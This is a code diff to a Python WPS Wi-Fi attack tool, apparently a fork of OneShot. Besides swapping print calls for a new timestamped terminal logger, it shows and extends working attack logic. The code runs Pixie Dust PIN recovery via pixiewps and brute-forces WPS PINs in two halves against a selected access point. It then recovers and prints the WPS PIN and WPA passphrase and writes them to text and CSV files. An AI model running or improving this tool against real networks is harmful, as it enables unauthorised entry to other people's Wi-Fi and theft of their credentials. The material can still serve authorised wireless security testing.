@@ -17,6 +17,116 @@ import csv
 from pathlib import Path
 from typing import Dict
 import wcwidth
+import threading
+import io
+
+
+# ──────────────────────────────────────────────
+# Real‑Time Terminal Logger
+# ──────────────────────────────────────────────
+class RealtimeLogger:
+    """
+    Prints every operation to the terminal in real‑time:
+    • commands being run
+    • their stdout/stderr (streamed live)
+    • errors / warnings / success
+    All lines are timestamped for traceability.
+
+    When sys.stdout is a StringIO wrapper (WebUI capture mode),
+    ANSI codes are automatically stripped so the web UI sees clean text.
+    """
+    _lock = threading.Lock()
+    _enabled = True
+
+    # ANSI colour codes
+    _CYAN    = '\033[96m'
+    _GREEN   = '\033[92m'
+    _YELLOW  = '\033[93m'
+    _RED     = '\033[91m'
+    _MAGENTA = '\033[95m'
+    _RESET   = '\033[00m'
+    _GREY    = '\033[90m'
+    _ANSI_RE = re.compile(r'\033\[[0-9;]*m')
+    _SEP     = '─' * 60
+
+    @classmethod
+    def _strip_ansi(cls, text: str) -> str:
+        """Remove ANSI escape codes when stdout is not a real terminal."""
+        if isinstance(sys.stdout, io.StringIO):
+            return cls._ANSI_RE.sub('', text)
+        return text
+
+    @classmethod
+    def _ts(cls):
+        return cls._GREY + datetime.now().strftime('%H:%M:%S') + cls._RESET
+
+    @classmethod
+    def _write(cls, text: str):
+        if not cls._enabled:
+            return
+        with cls._lock:
+            print(cls._strip_ansi(text))
+
+    @classmethod
+    def cmd(cls, command: str):
+        cls._write(f'  {cls._ts()} {cls._CYAN}▸ CMD{cls._RESET} {command}')
+
+    @classmethod
+    def info(cls, msg: str):
+        cls._write(f'  {cls._ts()} {cls._GREEN}ℹ{cls._RESET} {msg}')
+
+    @classmethod
+    def warn(cls, msg: str):
+        cls._write(f'  {cls._ts()} {cls._YELLOW}⚠{cls._RESET} {msg}')
+
+    @classmethod
+    def err(cls, msg: str):
+        cls._write(f'  {cls._ts()} {cls._RED}✖{cls._RESET} {msg}')
+
+    @classmethod
+    def ok(cls, msg: str):
+        cls._write(f'  {cls._ts()} {cls._GREEN}✔{cls._RESET} {msg}')
+
+    @classmethod
+    def stdout(cls, line: str):
+        cls._write(f'  {cls._ts()} {cls._GREY}│{cls._RESET} {line}')
+
+    @classmethod
+    def step(cls, msg: str):
+        cls._write(f'  {cls._ts()} {cls._MAGENTA}◈{cls._RESET} {msg}')
+
+    @classmethod
+    def separator(cls):
+        cls._write(cls._SEP)
+
+    @classmethod
+    def run_subprocess(cls, cmd: str, **kwargs) -> subprocess.CompletedProcess:
+        cls.cmd(cmd)
+        popen = subprocess.Popen(
+            cmd,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            encoding='utf-8',
+            errors='replace',
+            **{k: v for k, v in kwargs.items() if k not in ('stdout', 'stderr')}
+        )
+        lines = []
+        for raw_line in popen.stdout:
+            line = raw_line.rstrip('\n\r')
+            lines.append(line)
+            cls.stdout(line)
+        popen.wait()
+        result = subprocess.CompletedProcess(
+            args=cmd,
+            returncode=popen.returncode,
+            stdout='\n'.join(lines),
+        )
+        if popen.returncode == 0:
+            cls.ok(f'Exit code {popen.returncode}')
+        else:
+            cls.err(f'Exit code {popen.returncode}')
+        return result
 
 
 class NetworkAddress:
@@ -438,16 +548,22 @@ class Companion:
         self.lastPwr = 0
 
     def __init_wpa_supplicant(self):
-        print('[*] Running wpa_supplicant…')
         cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
+        RealtimeLogger.step('Initializing wpa_supplicant…')
+        RealtimeLogger.cmd(cmd)
         self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
         # Waiting for wpa_supplicant control interface initialization
         while True:
             ret = self.wpas.poll()
             if ret is not None and ret != 0:
-                raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
+                err = self.wpas.communicate()[0]
+                RealtimeLogger.err(f'wpa_supplicant failed (exit {ret})')
+                for l in err.splitlines():
+                    RealtimeLogger.stdout(l)
+                raise ValueError('wpa_supplicant returned an error: ' + err)
             if os.path.exists(self.wpas_ctrl_path):
+                RealtimeLogger.ok(f'wpa_supplicant started (ctrl: {self.wpas_ctrl_path})')
                 break
             time.sleep(.1)
 
@@ -480,7 +596,7 @@ class Companion:
         line = line.rstrip('\n')
 
         if verbose:
-            sys.stderr.write(line + '\n')
+            RealtimeLogger.stdout(line)
 
         if line.startswith('WPS: '):
             if 'Building Message M' in line:
@@ -492,11 +608,11 @@ class Companion:
                 self.connection_status.last_m_message = n
                 self.__print_with_indicators('*', 'Received WPS Message M{}'.format(n))
                 if n == 5:
-                    print('[+] The first half of the PIN is valid')
+                    RealtimeLogger.ok('The first half of the PIN is valid')
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
                 self.__print_with_indicators('*', 'Received WSC NACK')
-                print('[-] Error: wrong PIN code')
+                RealtimeLogger.err('Wrong PIN code')
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
                 assert(len(self.pixie_creds.e_nonce) == 16*2)
@@ -536,7 +652,7 @@ class Companion:
                 self.__print_with_indicators('*', 'Scanning…')
         elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
             self.connection_status.status = 'WPS_FAIL'
-            print('[-] wpa_supplicant returned WPS-FAIL')
+            RealtimeLogger.err('wpa_supplicant returned WPS-FAIL')
 #        elif 'NL80211_CMD_DEL_STATION' in line:
 #            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
         elif 'Trying to authenticate with' in line:
@@ -569,39 +685,42 @@ class Companion:
         elif pbc_mode and ('selected BSS ' in line):
             bssid = line.split('selected BSS ')[-1].split()[0].upper()
             self.connection_status.bssid = bssid
-            print('[*] Selected AP: {}'.format(bssid))
+            RealtimeLogger.ok(f'Selected AP via PBC: {bssid}')
         elif bssid in line and 'level=' in line:
             signal = line.split("level=")[1].split(" ")[0]
             if 'noise=' in line:
                 noise = line.split("noise=")[1].split(" ")[0]
-                print ("[i] Current signal: {}, noise: {}".format(signal, noise))
+                RealtimeLogger.info(f"Current signal: {signal}, noise: {noise}")
             else:
-                print ("[i] Current signal: {}".format(signal))
+                RealtimeLogger.info(f"Current signal: {signal}")
 
         return True
 
     def __runPixiewps(self, showcmd=False, full_range=False):
-        self.__print_with_indicators('*', 'Running Pixiewps…')
+        RealtimeLogger.step('Running Pixiewps (offline PIN recovery)…')
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
         if showcmd:
-            print(cmd)
-        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
-                           stderr=sys.stdout, encoding='utf-8', errors='replace')
-        print(r.stdout)
+            RealtimeLogger.cmd(cmd)
+        r = RealtimeLogger.run_subprocess(cmd)
         if r.returncode == 0:
-            lines = r.stdout.splitlines()
-            for line in lines:
+            for line in r.stdout.splitlines():
                 if ('[+]' in line) and ('WPS pin' in line):
                     pin = line.split(':')[-1].strip()
                     if pin == '<empty>':
                         pin = "''"
+                    RealtimeLogger.ok(f'Pixiewps recovered PIN: {pin}')
                     return pin
+            RealtimeLogger.warn('Pixiewps ran but could not find PIN in output')
+        else:
+            RealtimeLogger.err('Pixiewps failed')
         return False
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
-        print(f"[+] WPS PIN: '{wps_pin}'")
-        print(f"[+] WPA PSK: '{wpa_psk}'")
-        print(f"[+] AP SSID: '{essid}'")
+        RealtimeLogger.separator()
+        RealtimeLogger.ok(f'WPS PIN  → {wps_pin}')
+        RealtimeLogger.ok(f'WPA PSK  → {wpa_psk}')
+        RealtimeLogger.ok(f'AP SSID  → {essid}')
+        RealtimeLogger.separator()
 
     def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
         if not os.path.exists(self.reports_dir):
@@ -619,40 +738,41 @@ class Companion:
             if writeTableHeader:
                 csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
             csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
-        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
+        RealtimeLogger.ok(f'Credentials saved to {filename}.txt + .csv')
 
     def __savePin(self, bssid, pin):
         filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
         with open(filename, 'w') as file:
             file.write(pin)
-        print('[i] PIN saved in {}'.format(filename))
+        RealtimeLogger.info(f'PIN saved to {filename}')
 
     def __prompt_wpspin(self, bssid):
         pins = self.generator.getSuggested(bssid)
         if len(pins) > 1:
-            print(f'PINs generated for {bssid}:')
-            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
+            RealtimeLogger.info(f'Generated PINs for {bssid}:')
+            print('  {:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
             for i, pin in enumerate(pins):
                 number = '{})'.format(i + 1)
-                line = '{:<3} {:<10} {:<}'.format(
+                line = '  {:<3} {:<10} {:<}'.format(
                     number, pin['pin'], pin['name'])
                 print(line)
             while 1:
-                pinNo = input('Select the PIN: ')
+                pinNo = input('  Select the PIN: ')
                 try:
                     if int(pinNo) in range(1, len(pins)+1):
                         pin = pins[int(pinNo) - 1]['pin']
                     else:
                         raise IndexError
                 except Exception:
-                    print('Invalid number')
+                    print('  Invalid number')
                 else:
                     break
         elif len(pins) == 1:
             pin = pins[0]
-            print('[i] The only probable PIN is selected:', pin['name'])
+            RealtimeLogger.info(f'The only probable PIN selected: {pin["name"]} = {pin["pin"]}')
             pin = pin['pin']
         else:
+            RealtimeLogger.warn('No PIN suggestions available')
             return None
         return pin
 
@@ -664,20 +784,24 @@ class Companion:
         self.wpas.stdout.read(300)   # Clean the pipe
         if pbc_mode:
             if bssid:
-                print(f"[*] Starting WPS push button connection to {bssid}…")
+                RealtimeLogger.step(f'Starting WPS push button connection to {bssid}…')
                 cmd = f'WPS_PBC {bssid}'
             else:
-                print("[*] Starting WPS push button connection…")
+                RealtimeLogger.step('Starting WPS push button connection…')
                 cmd = 'WPS_PBC'
         else:
-            print(f"[*] Trying PIN '{pin}'…")
+            RealtimeLogger.step(f'Trying PIN {pin}')
             cmd = f'WPS_REG {bssid} {pin}'
 
+        RealtimeLogger.cmd(f'wpa_ctrl: {cmd}')
         r = self.sendAndReceive(cmd)
         if 'OK' not in r:
             self.connection_status.status = 'WPS_FAIL'
-            print(self._explain_wpas_not_ok_status(cmd, r))
+            msg = self._explain_wpas_not_ok_status(cmd, r)
+            RealtimeLogger.err(msg)
             return False
+
+        RealtimeLogger.ok(f'WPS command accepted by wpa_supplicant')
 
         while True:
             res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower())
@@ -702,12 +826,15 @@ class Companion:
                     filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                     with open(filename, 'r') as file:
                         t_pin = file.readline().strip()
+                        RealtimeLogger.info(f'Previously calculated PIN found: {t_pin}')
                         if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                             pin = t_pin
+                            RealtimeLogger.info(f'Using saved PIN: {pin}')
                         else:
                             raise FileNotFoundError
                 except FileNotFoundError:
                     pin = self.generator.getLikely(bssid) or '12345670'
+                    RealtimeLogger.info(f'Generated PIN: {pin}')
             elif not pbc_mode:
                 # If not pixiemode, ask user to select a pin from the list
                 pin = self.__prompt_wpspin(bssid) or '12345670'
@@ -744,7 +871,7 @@ class Companion:
                     return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                 return False
             else:
-                print('[!] Not enough data to run Pixie Dust attack')
+                RealtimeLogger.err('Not enough data collected for Pixie Dust attack')
                 return False
         else:
             if store_pin_on_fail:
@@ -753,46 +880,41 @@ class Companion:
             return False
 
     def __first_half_bruteforce(self, bssid, f_half, delay=None):
-        """
-        @f_half — 4-character string
-        """
         checksum = self.generator.checksum
         while int(f_half) < 10000:
             t = int(f_half + '000')
             pin = '{}000{}'.format(f_half, checksum(t))
             self.single_connection(bssid, pin)
             if self.connection_status.isFirstHalfValid():
-                print('[+] First half found')
+                RealtimeLogger.ok(f'First half found: {f_half}')
                 return f_half
             elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
+                RealtimeLogger.warn(f'WPS transaction failed at {f_half}, re-trying')
                 return self.__first_half_bruteforce(bssid, f_half)
             f_half = str(int(f_half) + 1).zfill(4)
             self.bruteforce.registerAttempt(f_half)
             if delay:
                 time.sleep(delay)
-        print('[-] First half not found')
+        RealtimeLogger.err('First half not found after exhausting all PINs')
         return False
 
     def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
-        """
-        @f_half — 4-character string
-        @s_half — 3-character string
-        """
         checksum = self.generator.checksum
         while int(s_half) < 1000:
             t = int(f_half + s_half)
             pin = '{}{}{}'.format(f_half, s_half, checksum(t))
             self.single_connection(bssid, pin)
             if self.connection_status.last_m_message > 6:
+                RealtimeLogger.ok(f'Second half found: {s_half}')
                 return pin
             elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
+                RealtimeLogger.warn(f'WPS transaction failed at {f_half}{s_half}, re-trying')
                 return self.__second_half_bruteforce(bssid, f_half, s_half)
             s_half = str(int(s_half) + 1).zfill(3)
             self.bruteforce.registerAttempt(f_half + s_half)
             if delay:
                 time.sleep(delay)
+        RealtimeLogger.err('Second half not found')
         return False
 
     def smart_bruteforce(self, bssid, start_pin=None, delay=None):
@@ -801,8 +923,10 @@ class Companion:
             try:
                 filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                 with open(filename, 'r') as file:
+                    RealtimeLogger.info(f'Saved bruteforce session found for {bssid}')
                     if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
                         mask = file.readline().strip()
+                        RealtimeLogger.info(f'Resuming from mask {mask}')
                     else:
                         raise FileNotFoundError
             except FileNotFoundError:
@@ -810,29 +934,40 @@ class Companion:
         else:
             mask = start_pin[:7]
 
+        RealtimeLogger.step(f'Starting smart bruteforce from mask {mask}')
+        RealtimeLogger.info('Bruteforcing first half (0000-9999)…')
+
         try:
             self.bruteforce = BruteforceStatus()
             self.bruteforce.mask = mask
             if len(mask) == 4:
                 f_half = self.__first_half_bruteforce(bssid, mask, delay)
                 if f_half and (self.connection_status.status != 'GOT_PSK'):
+                    RealtimeLogger.info('Bruteforcing second half (000-999)…')
                     self.__second_half_bruteforce(bssid, f_half, '001', delay)
             elif len(mask) == 7:
                 f_half = mask[:4]
                 s_half = mask[4:]
+                RealtimeLogger.info(f'Resuming second half bruteforce from {s_half}')
                 self.__second_half_bruteforce(bssid, f_half, s_half, delay)
             raise KeyboardInterrupt
         except KeyboardInterrupt:
-            print("\nAborting…")
+            RealtimeLogger.warn('Bruteforce aborted')
             filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
             with open(filename, 'w') as file:
                 file.write(self.bruteforce.mask)
-            print('[i] Session saved in {}'.format(filename))
+            RealtimeLogger.info(f'Session saved to {filename} (mask: {self.bruteforce.mask})')
             if args.loop:
                 raise KeyboardInterrupt
 
     def __print_with_indicators(self, level, msg):
-        print('[{}] [{}] {}'.format(level, self.lastPwr, msg))
+        line = '[{}] [{}] {}'.format(level, self.lastPwr, msg)
+        if level in ('+',):
+            RealtimeLogger.ok(msg)
+        elif level in ('!', '*'):
+            RealtimeLogger.step(msg)
+        else:
+            RealtimeLogger.info(msg)
 
     def cleanup(self):
         self.retsock.close()
@@ -935,8 +1070,9 @@ class WiFiScanner:
             networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
 
         cmd = 'iw dev {} scan'.format(self.interface)
-        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
-                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
+        RealtimeLogger.cmd(cmd)
+        RealtimeLogger.step('Scanning for Wi‑Fi networks (this may take 5‑10 seconds)…')
+        proc = RealtimeLogger.run_subprocess(cmd)
         lines = proc.stdout.splitlines()
         networks = []
         matchers = {
@@ -955,7 +1091,7 @@ class WiFiScanner:
 
         for line in lines:
             if line.startswith('command failed:'):
-                print('[!] Error:', line)
+                RealtimeLogger.err(f'iw scan failed: {line}')
                 return False
             line = line.strip('\t')
             for regexp, handler in matchers.items():
@@ -1107,7 +1243,7 @@ class WiFiScanner:
     def prompt_network(self) -> str:
         networks = self.iw_scanner()
         if not networks:
-            print('[-] No WPS networks found.')
+            RealtimeLogger.err('No WPS networks found.')
             return
         while 1:
             try:
@@ -1115,23 +1251,25 @@ class WiFiScanner:
                 if networkNo.lower() in ('r', '0', ''):
                     return self.prompt_network()
                 elif int(networkNo) in networks.keys():
-                    return networks[int(networkNo)]['BSSID']
+                    bssid = networks[int(networkNo)]['BSSID']
+                    RealtimeLogger.info(f'Selected target: {bssid}')
+                    return bssid
                 else:
                     raise IndexError
             except Exception:
-                print('Invalid number')
+                print('  Invalid number')
 
 
 def ifaceUp(iface, down=False):
-    if down:
-        action = 'down'
-    else:
-        action = 'up'
+    action = 'down' if down else 'up'
     cmd = 'ip link set {} {}'.format(iface, action)
-    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
+    RealtimeLogger.cmd(cmd)
+    res = RealtimeLogger.run_subprocess(cmd)
     if res.returncode == 0:
+        RealtimeLogger.ok(f'Interface {iface} is {action}')
         return True
     else:
+        RealtimeLogger.err(f'Failed to bring {iface} {action} (exit {res.returncode})')
         return False
 
 
@@ -1269,19 +1407,28 @@ if __name__ == '__main__':
 
     args = parser.parse_args()
 
+    # ── Startup banner ──
+    RealtimeLogger.separator()
+    RealtimeLogger.info('OPX OneShot starting up')
+    if args.verbose:
+        RealtimeLogger.info('Verbose mode ON — all wpa_supplicant output will be shown live')
+
     if sys.hexversion < 0x03060F0:
         die("The program requires Python 3.6 and above")
     if os.getuid() != 0:
         die("Run it as root")
 
     if args.mtk_wifi:
+        RealtimeLogger.step('Activating MediaTek Wi‑Fi interface…')
         wmtWifi_device = Path("/dev/wmtWifi")
         if not wmtWifi_device.is_char_device():
             die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
                 "/dev/wmtWifi does not exist or it is not a character device")
         wmtWifi_device.chmod(0o644)
         wmtWifi_device.write_text("1")
+        RealtimeLogger.ok('/dev/wmtWifi activated')
 
+    RealtimeLogger.step(f'Bringing interface {args.interface} up…')
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
@@ -1289,6 +1436,7 @@ if __name__ == '__main__':
         try:
             companion = Companion(args.interface, args.write, print_debug=args.verbose)
             if args.pbc:
+                RealtimeLogger.info('PBC mode — connecting via push button')
                 companion.single_connection(pbc_mode=True)
             else:
                 if not args.bssid:
@@ -1299,14 +1447,20 @@ if __name__ == '__main__':
                         vuln_list = []
                     scanner = WiFiScanner(args.interface, vuln_list)
                     if not args.loop:
-                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
+                        RealtimeLogger.info('No BSSID specified — scanning for available networks')
                     args.bssid = scanner.prompt_network()
 
                 if args.bssid:
                     companion = Companion(args.interface, args.write, print_debug=args.verbose)
                     if args.bruteforce:
+                        RealtimeLogger.info(f'Starting bruteforce attack on {args.bssid}')
                         companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                    elif args.pixie_dust:
+                        RealtimeLogger.info(f'Starting Pixie Dust attack on {args.bssid}')
+                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
+                                                    args.show_pixie_cmd, args.pixie_force)
                     else:
+                        RealtimeLogger.info(f'Starting standard PIN attack on {args.bssid}')
                         companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
                                                     args.show_pixie_cmd, args.pixie_force)
             if not args.loop:
@@ -1316,16 +1470,21 @@ if __name__ == '__main__':
         except KeyboardInterrupt:
             if args.loop:
                 if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
-                    print("Aborting…")
+                    RealtimeLogger.info('Aborting…')
                     break
                 else:
                     args.bssid = None
             else:
-                print("\nAborting…")
+                RealtimeLogger.warn('Aborting…')
                 break
 
     if args.iface_down:
+        RealtimeLogger.step(f'Bringing interface {args.interface} down…')
         ifaceUp(args.interface, down=True)
 
     if args.mtk_wifi:
+        RealtimeLogger.step('Deactivating MediaTek Wi‑Fi interface…')
         wmtWifi_device.write_text("0")
+
+    RealtimeLogger.separator()
+    RealtimeLogger.info('OPX OneShot finished')
